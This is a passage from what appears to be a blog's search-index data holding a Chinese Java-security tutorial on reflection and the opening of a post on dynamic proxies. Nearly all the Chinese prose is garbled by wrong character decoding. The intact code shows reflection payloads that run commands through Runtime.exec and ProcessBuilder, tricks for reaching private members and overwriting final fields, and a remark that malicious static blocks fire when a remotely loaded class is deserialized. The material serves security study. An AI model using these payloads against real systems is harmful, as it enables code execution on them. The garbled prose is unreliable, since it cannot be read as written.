.javaåç¼€æ–‡ä»¶ä¼šåœ¨è¿è¡Œå‰è¢«ç¼–è¯‘æˆ.classåç¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å†…","title":"Javaä¹‹ClassLoader"},{"content":"å‰ä¸ä¹…å­¦ä¹ äº†åŠ¨æ€ä»£ç†çš„ä¸€äº›çŸ¥è¯†ï¼Œç„¶åè·Ÿç€pç¥çš„ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒè¿›è¡Œåˆæ­¥å­¦ä¹ ï¼Œç»“åˆsu18å¸ˆå‚…çš„JavaSecé¡¹ç›®ï¼Œä¸€äº›ç›¸å…³åšå®¢ï¼Œå¯¹Javaåå°„è¿›è¡Œäº†å­¦ä¹ ã€‚æ„Ÿè§‰pç¥çš„ç›¸å…³ä»‹ç»æ›´åŠ çš„è´´è¿‘åŸç†ã€ä¸€äº›å°trickã€‚\nåå°„æ˜¯â¼¤å¤šæ•°è¯­â¾”â¾¥éƒ½å¿…ä¸å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰â½…æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„â½…æ³•å¯ä»¥è°ƒâ½¤ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­â¾”é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚\nåå°„çš„ä½œç”¨ æ¯”å¦‚å¯¹äºè¿™æ ·ä¸€æ®µä»£ç ï¼Œå¦‚ä½•ä¸ä¼ å…¥å…·ä½“å‚æ•°ï¼Œå¹¶ä¸çŸ¥é“å…·ä½“ä½œç”¨æ˜¯ä»€ä¹ˆ\n1 2 3 4 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } ä¸Šé¢çš„ä¾‹å­ï¼Œè¿ç”¨äº†åå°„é‡Œæä¸ºé‡è¦çš„æ–¹æ³•\nè·å–ç±»çš„æ–¹æ³•:forName å®ä¾‹åŒ–å¯¹è±¡çš„æ–¹æ³•:newInstance è·å–å‡½æ•°çš„æ–¹æ³•:getMethod æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•:invoke åŸºæœ¬ä¸Šï¼Œè¿™å‡ ä¸ªæ–¹æ³•åŒ…æ½äº†Javaå®‰å…¨é‡Œé¢çš„ä¸åå°„ç›¸å…³çš„payload\nè·å–classå¯¹è±¡ forNameå¹¶ä¸æ˜¯è·å–â€œç±»â€çš„å”¯ä¸€é€”å¾„ï¼Œè·å–â€œç±»â€çš„æ–¹å¼å¾ˆå¤šï¼Œä¹Ÿå°±æ˜¯java.lang.Classå¯¹è±¡ã€‚\nobj.getClass()å¦‚æœä¸Šä¸‹æ–‡å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹obj,æˆ‘ä»¬å¯ä»¥é€šè¿‡obj.getClass()æ¥è·å–å¯¹åº”çš„ç±» Test.class å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥ æ‹¿å®ƒçš„ class å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚ Class.forName å¦‚æœçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è¦è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿ç”¨forNameæ¥è·å– classLoader.loadClass(\u0026quot;\u0026quot;) åŒæ ·ï¼Œå¦‚æœçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œä¹Ÿå¯ä»¥é€šè¿‡classLoaderçš„loadClassæ–¹æ³•æ¥å®ç°è·å– è·å–æ•°ç»„ç±»å‹çš„Classå¯¹è±¡éœ€è¦ç‰¹æ®Šæ³¨æ„,éœ€è¦ä½¿ç”¨Javaç±»å‹çš„æè¿°ç¬¦æ–¹å¼ï¼Œå¦‚ä¸‹ï¼š\n1 2 Class\u0026lt;?\u0026gt; doubleArray = Class.forName(\u0026#34;[D\u0026#34;);//ç›¸å½“äºdouble[].class Class\u0026lt;?\u0026gt; cStringArray = Class.forName(\u0026#34;[[Ljava.lang.String;\u0026#34;);// ç›¸å½“äºString[][].class forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š\nç¬¬â¼€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„è·å–classçš„â½…å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š\n1 2 3 Class.forName(className) // ç­‰äº Class.forName(className, true, currentLoader) é»˜è®¤æƒ…å†µä¸‹ï¼Œ forName æ˜¯çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ClassLoaderã€‚\nJavaç±»è£…è½½çš„è¿‡ç¨‹ åŠ è½½\nJvmæŠŠclassæ–‡ä»¶å­—èŠ‚ç åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†è¿™äº›é™æ€æ•°æ®è£…æ¢æˆè¿è¡Œæ—¶æ•°æ®åŒºä¸­æ–¹æ³•åŒºçš„ç±»å‹æ•°æ®ï¼Œåœ¨è¿è¡Œæ—¶æ•°æ®åŒºå †ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºç±»æ•°æ®çš„è®¿é—®å…¥å£ã€‚ æ³¨ï¼šæ–¹æ³•åŒºä¸ä»…ä»…æ˜¯å­˜æ”¾æ–¹æ³•ï¼Œå®ƒå­˜æ”¾çš„æ˜¯ç±»çš„ç±»å‹ä¿¡æ¯ã€‚ é“¾æ¥ï¼šæ‰§è¡Œä¸‹é¢çš„æ ¡éªŒã€å‡†å¤‡å’Œè§£ææ­¥éª¤ï¼Œå…¶ä¸­è§£ææ­¥éª¤æ˜¯å¯é€‰çš„\næ ¡éªŒï¼šæ£€æŸ¥åŠ è½½çš„classæ–‡ä»¶çš„æ­£ç¡®æ€§å’Œå®‰å…¨æ€§\nå‡†å¤‡ï¼šä¸ºç±»å˜é‡åˆ†é…å­˜å‚¨ç©ºé—´å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹å€¼ï¼Œç±»å˜é‡éšç±»å‹ä¿¡æ¯å­˜æ”¾åœ¨æ–¹æ³•åŒºä¸­,ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿ï¼Œä½¿ç”¨ä¸å½“å’Œå®¹æ˜“é€ æˆå†…å­˜æ³„æ¼ã€‚\næ³¨ï¼šç±»å˜é‡å°±æ˜¯staticå˜é‡ï¼›åˆå§‹å€¼æŒ‡çš„æ˜¯ç±»å˜é‡ç±»å‹çš„é»˜è®¤å€¼è€Œä¸æ˜¯å®é™…è¦èµ‹çš„å€¼\nè§£æï¼šjvmå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨\nåˆå§‹åŒ–ï¼šæ‰§è¡Œç±»å˜é‡èµ‹å€¼å’Œé™æ€ä»£ç å—\nå¯¹äºæ˜¯å¦åˆå§‹åŒ–ï¼Œè¿™ä¸ªæ¦‚å¿µç»“åˆpç¥çš„demoä»¥åŠç›¸å…³jvmä¸­ç±»åŠ è½½çš„æœºåˆ¶çš„ç†è§£ï¼šåˆå§‹åŒ–æŒ‡çš„æ˜¯æ¿€æ´»ç±»çš„é™æ€å˜é‡çš„åˆå§‹åŒ–Javaä»£ç å’Œé™æ€Javaä»£ç å—ï¼Œå¹¶åˆå§‹åŒ–ç¨‹åºå‘˜è®¾ç½®çš„å˜é‡å€¼ã€‚\nå¦‚æœè®¾ç½®initalize=flaseï¼Œåˆ™è£…è½½è¿‡ç¨‹ä¸­é“¾æ¥ä¸ä¼šè¿›è¡Œï¼Œå› æ­¤ä¹Ÿä¸ä¼šåˆå§‹åŒ–ã€‚å¦å¤–ï¼Œå¯¹äºforNameè·å¾—çš„â€œclassâ€æ¥è¯´ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä¸åŒä»£ç å—ã€æ„é€ å‡½æ•°éƒ½ä¸ä¼šåˆå§‹åŒ–ï¼Œåªæœ‰è°ƒç”¨äº†newInstance()æ–¹æ³•æ‰å¯ä»¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»çš„å¯¹è±¡ã€‚\nä»¥å¦‚ä¸‹ç±»ä¸ºä¾‹å­ï¼Œç ”ç©¶ä¸€ä¸‹staticä»£ç å—ã€æ™®é€šä»£ç å—ã€æ„é€ å‡½æ•°è°ƒç”¨é¡ºåºã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 public class Demo { private int a; { System.out.printf(\u0026#34;Empty block initial %s\\n\u0026#34;, this.getClass()); } static { System.out.printf(\u0026#34;Static initial %s\\n\u0026#34;,ReflectTest.class); } public Demo() { System.out.printf(\u0026#34;Initial %s\\n\u0026#34;, this.getClass()); } } è®¾ç½®falseçŠ¶æ€ è®¾ç½®trueçŠ¶æ€ newInstance static {} å°±æ˜¯åœ¨forName()ä¸­initalize=trueçš„æ—¶å€™è°ƒâ½¤çš„ï¼Œâ½½{}ä¸­çš„ä»£ç ä¼šæ”¾åœ¨newInstanceå®ä¾‹åŒ–ç±»çš„æ—¶å€™è¿è¡Œï¼Œåœ¨æ„é€ å‡½æ•°çš„ super()åâ¾¯ï¼Œä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰â¾¯ã€‚\næ‰€ä»¥åœ¨å®é™…è¿ç”¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨staticä¸­å†™å…¥æ¶æ„ä»£ç æ„æˆæ¶æ„ç±»ï¼Œå½“ç¨‹åºè¿œç¨‹åŠ è½½æ¶æ„ç±»ï¼Œäº§ç”Ÿååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè§¦å‘ã€‚\nRuntimeå•ä¾‹æ¨¡å¼åå°„ Javaçš„æ™®é€šç±»C1ä¸­æ”¯æŒç¼–å†™å†…éƒ¨ç±» C2 ,è€Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š C1.class å’ŒC1$C2.classï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–ä»¬çœ‹ä½œä¸¤ä¸ªæ— å…³çš„ç±»ï¼Œé€šè¿‡ Class.forName(\u0026quot;C1$C2\u0026quot;) å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ã€‚\nclass.newInstanceä½œç”¨æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ•°æ„é€ ï¼Œä½†æ˜¯å¦‚æœç±»æ²¡æœ‰æ— å‚æ•°æ„é€ å‡½æ•°æˆ–è€…ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œå°±æ— æ³•æ­£å¸¸è¿è¡Œã€‚\nå¯¹äºjava.lang.Runtimeæ¥è¯´ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨è¿™ä¸ªç±»æ¥æ‰§è¡ŒPayload,ä½†æ˜¯ä¸èƒ½ç›´æ¥æ¥æ‰§è¡Œå‘½ä»¤\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); clazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(clazz.newInstance(), \u0026#34;id\u0026#34;); // java.lang.Runtime.exec(\u0026#34;id\u0026#34;) ä¼šäº§ç”ŸæŠ¥é”™\nåŸå› æ˜¯Runtimeç±»æ„é€ æ–¹æ³•ç§æœ‰çš„ã€‚è¿™ä¸ªå°±æ˜¯å¾ˆå¸¸è§çš„è®¾è®¡æ¨¡å¼:å•ä¾‹æ¨¡å¼ã€‚\nä»¥java.lang.Runtimeä¸ºä¾‹ï¼š\nç±»åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œä¹‹ååªèƒ½é€šè¿‡getRuntimeæ¥è·å–Runtime()å¯¹è±¡ï¼Œæˆ‘ä»¬å°†ä¸Šè¿°payloadè¿›è¡Œä¿®æ”¹ã€‚\n1 2 3 4 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); clazz.getMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(clazz),\u0026#34;open -a Calculator.app\u0026#34;) //java.lang.Runtime.getRuntime().exec(\u0026#34;open -a Calculator.app\u0026#34;) æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸Šè¿°ä»£ç è¿›è¡Œæ‹†åˆ†ï¼š\n1 2 Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method execMethod = clazz.getMethod(\u0026#34;exec\u0026#34;, String.class); Method getRuntimeMethod = clazz.getMethod(\u0026#34;getRuntime\u0026#34;); Object runtime = getRuntimeMethod.invoke(clazz); execMethod.invoke(runtime, \u0026#34;open -a Calculator.app\u0026#34;); è¿™é‡Œå› ä¸ºgetRuntimeä¸ºé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦ä¼ å…¥classï¼Œexecä¸ºæ­£å¸¸çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä¼ å…¥å¯¹åº”çš„å®ä¾‹ç±»ã€‚\nConstructorä½¿ç”¨ å¯¹äºé—®é¢˜:\nå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±» å‘¢ï¼Ÿ å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ å¯¹äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°getConstructor.\nå’Œ getMethod ç±»ä¼¼ï¼Œ getConstructoræ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œæ‰€ä»¥å¿…é¡»ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°ã€‚è·å–åˆ°æ„é€ å‡½æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨newInstanceæ¥æ‰§è¡Œã€‚\næˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨ start() æ¥æ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getMethod(\u0026#34;start\u0026#34;).invoke(clazz.getConstructor(List.class).newInstance( Arrays.asList(\u0026#34;open\u0026#34;,\u0026#34;-a\u0026#34;,\u0026#34;Calculator.app\u0026#34;))); é€šè¿‡getMethod(\u0026quot;start\u0026quot;)è·å–åˆ°startæ–¹æ³•ï¼Œç„¶åinvokeæ‰§è¡Œï¼Œinvokeçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ProcessBuilder Objectäº†ã€‚\nå¦‚æœä½¿ç”¨public ProcessBuilder(String... command)è¿™ä¸ªæ„é€ å‡½æ•°ã€‚\njavaçš„å¯å˜é•¿å‚æ•°ï¼Œå¯ä»¥ç”¨...è¯­æ³•æ¥è¡¨ç¤ºè¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯å˜çš„ã€‚\nå¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaå…¶å®åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ä¸‹è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚æ˜¯ç­‰ä»·çš„(ä¹Ÿå°±ä¸èƒ½é‡è½½)ï¼š\n1 2 public void hello(String[] names) {} public void hello(String...names) {} æ‰€ä»¥ï¼Œæˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„String[].classä¼ ç»™getConstructorï¼Œè·å–ProcessBuilderçš„ç¬¬äºŒç±»ç§æ„é€ å‡½æ•°ï¼š\n1 2 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getConstructor(String[].class) åœ¨è°ƒç”¨newInstanceçš„æ—¶å€™ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™ProcessBuilder çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æ•´ä¸ªPayloadå¦‚ä¸‹ï¼š\n1 2 3 Class clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;open\u0026#34;,\u0026#34;-a\u0026#34;,\u0026#34;Calculator.app\u0026#34;}})).start(); ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæ–¹æ³•ã€æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œ\nä¸»è¦è®¾è®¡getDeclaredç³»åˆ—çš„åå°„ï¼Œè¯¦è§åé¢çš„å†…å®¹å¯¹getDeclaredå’Œæ™®é€šçš„getçš„åŒºåˆ«ä»‹ç»ã€‚ åå°„çš„å…·ä½“ä½¿ç”¨ åå°„è°ƒç”¨ç±»æ–¹æ³• Classå¯¹è±¡æä¾›äº†ä¸€ä¸ªè·å–æŸä¸ªç±»çš„æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ç±»å‹æ¥è·å–æŒ‡å®šæˆå‘˜æ–¹æ³•ã€‚\nè·å–å½“å‰ç±»æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•:\n1 2 3 4 5 6 7 8 9 try { Class clazz = Class.forName(\u0026#34;com.reus.reflect.Demo\u0026#34;); Method[] methods = clazz.getDeclaredMethods(); for(Method method : methods){ System.out.println(method); } }catch (Exception e){ e.printStackTrace(); } è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜æ–¹æ³•\n1 2 Method method = clazz.getDeclaredMethod(\u0026#34;æ–¹æ³•å\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;æ–¹æ³•å\u0026#34;, å‚æ•°ç±»å‹å¦‚String.classï¼Œå¤šä¸ªå‚æ•°ç”¨\u0026#34;,\u0026#34;å·éš”å¼€); getMethodå’ŒgetDeclaredMethodéƒ½èƒ½å¤Ÿè·å–åˆ°ç±»æˆå‘˜æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äº*\ngetMethodåªèƒ½è·å–åˆ°å½“å‰ç±»å’Œçˆ¶ç±»çš„æ‰€æœ‰æœ‰æƒé™çš„æ–¹æ³•(å¦‚ï¼špublic) getDeclaredMethodèƒ½è·å–åˆ°å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜æ–¹æ³•(ä¸åŒ…å«çˆ¶ç±»)ã€‚ åå°„æ‰§è¡Œæ–¹æ³•ï¼šè·å–åˆ°java.lang.reflect.Methodå¯¹è±¡ä»¥åæˆ‘ä»¬å¯ä»¥é€šè¿‡Methodçš„invokeæ–¹æ³•æ¥è°ƒç”¨ç±»æ–¹æ³•ã€‚\n1 method.invoke(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼ï¼Œå¤šä¸ªå‚æ•°å€¼ç”¨\u0026#34;,\u0026#34;éš”å¼€); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } invokeçš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š\nå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å®ä¾‹å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» invokeçš„ç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœå½“å‰è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¸ä¼ ï¼Œå¦‚æœæœ‰å‚æ•°é‚£ä¹ˆå°±å¿…é¡»ä¸¥æ ¼çš„ä¾æ¬¡ä¼ å…¥å¯¹åº”çš„å‚æ•°ç±»å‹ã€‚\nåå°„è°ƒç”¨æˆå‘˜å˜é‡ Javaåå°„ä¸ä½†å¯ä»¥è·å–ç±»æ‰€æœ‰çš„æˆå‘˜å˜é‡åç§°ï¼Œè¿˜å¯ä»¥æ— è§†æƒé™ä¿®é¥°ç¬¦å®ç°ä¿®æ”¹å¯¹åº”çš„å€¼ã€‚\nè·å–å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼š\n1 Field fields = clazz.getDeclaredFields(); è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼š\n1 Field field = clazz.getDeclaredField(\u0026#34;å˜é‡å\u0026#34;); getFieldå’ŒgetDeclaredFieldçš„åŒºåˆ«åŒgetMethodå’ŒgetDeclaredMethodã€‚\nè·å–æˆå‘˜å˜é‡å€¼ï¼š\n1 Object obj = field.get(ç±»å®ä¾‹å¯¹è±¡); ä¿®æ”¹æˆå‘˜å˜é‡å€¼ï¼š\n1 field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); åŒç†ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹çš„æˆå‘˜å˜é‡æƒé™æ—¶å¯ä»¥ä½¿ç”¨: field.setAccessible(true)çš„æ–¹å¼ä¿®æ”¹ä¸ºè®¿é—®æˆå‘˜å˜é‡è®¿é—®æƒé™ã€‚\nå¦‚æœæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¢«finalå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å…ˆä¿®æ”¹æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 // åå°„è·å–Fieldç±»çš„modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // è®¾ç½®modifiersä¿®æ”¹æƒé™ modifiers.setAccessible(true); // ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼ modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // ä¿®æ”¹æˆå‘˜å˜é‡å€¼ field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); ","permalink":"http://www.reus09.top/posts/tech/java%E5%8F%8D%E5%B0%84/","summary":"å‰ä¸ä¹…å­¦ä¹ äº†åŠ¨æ€ä»£ç†çš„ä¸€äº›çŸ¥è¯†ï¼Œç„¶åè·Ÿç€pç¥çš„ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒè¿›è¡Œåˆæ­¥å­¦ä¹ ï¼Œç»“åˆsu18å¸ˆå‚…çš„JavaSecé¡¹ç›®ï¼Œä¸€äº›ç›¸å…³åšå®¢ï¼Œå¯¹Javaå","title":"Javaåå°„"},{"content":"å®é™…ä¸Šåœ¨ä¹‹å‰çš„å­¦ä¹ é˜¶æ®µå¤ç°äº†ä¸€äº›CVEæ¼æ´ï¼Œä½†æ˜¯å‘ç°è¿˜æ˜¯å­˜åœ¨åŸºç¡€æ–¹é¢çš„ç¼ºé™·ï¼Œå¯¹Javaå®‰å…¨ç¼ºä¹ç³»ç»Ÿæ€§çš„æ•´ç†ï¼Œå› æ­¤ä»ä»Šå¤©è¿™ç¯‡å¼€å§‹ï¼Œç³»ç»Ÿçš„æ•´ç†å­¦ä¹ ä¸€ä¸‹Javaå®‰å…¨çš„åŸºç¡€çŸ¥è¯†ï¼Œä»Šå¤©å…ˆå­¦ä¹ ä¸€ä¸‹javaé‡Œé¢çš„åŠ¨æ€ä»£ç†ã€‚\n0x01 æ¦‚å¿µ ä»£ç†æ¨¡å¼æ˜¯å¸¸ç”¨çš„ java è®¾è®¡æ¨¡å¼ï¼Œä»–çš„ç‰¹å¾æ˜¯ä»£ç†ç±»ä¸å§”æ‰˜ç±»æœ‰åŒæ ·çš„æ¥å£ï¼Œä»£ç†ç±»ä¸»è¦è´Ÿè´£ä¸ºå§”æ‰˜ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯ã€æŠŠæ¶ˆæ¯è½¬å‘ç»™å§”æ‰˜ç±»ï¼Œä»¥åŠäº‹åå¤„ç†æ¶ˆæ¯ç­‰ã€‚ä»£ç†ç±»ä¸å§”æ‰˜ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ä¸ä¸€ä¸ªå§”æ‰˜ç±»çš„å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»çš„å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨å§”æ‰˜ç±»çš„å¯¹è±¡çš„ç›¸å…³æ–¹æ³•ï¼Œæ¥æä¾›ç‰¹å®šçš„æœåŠ¡ã€‚\nè¿™é‡Œéœ€è¦å…³æ³¨çš„é‡ç‚¹æœ‰å¦‚ä¸‹å‡ ç‚¹ - ä»£ç†ç±»ä¸å§”æ‰˜ç±»æœ‰åŒæ ·çš„æ¥å£ - ä»£ç†ç±»ä¸»è¦è´Ÿè´£ä¸ºå§”æ‰˜ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯ç­‰ç®€è€Œè¨€ä¹‹ç»è¿‡ä»£ç†çš„ç±»æ–¹æ³•è¢«è°ƒç”¨åä¼šå…ˆç»è¿‡ä»£ç†ç±»çš„å¤„ç†ã€‚ - ä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ä¸ä¸€ä¸ªå§”æ‰˜ç±»çš„å¯¹è±¡å…³è”\nä»è¿™é‡Œä½ 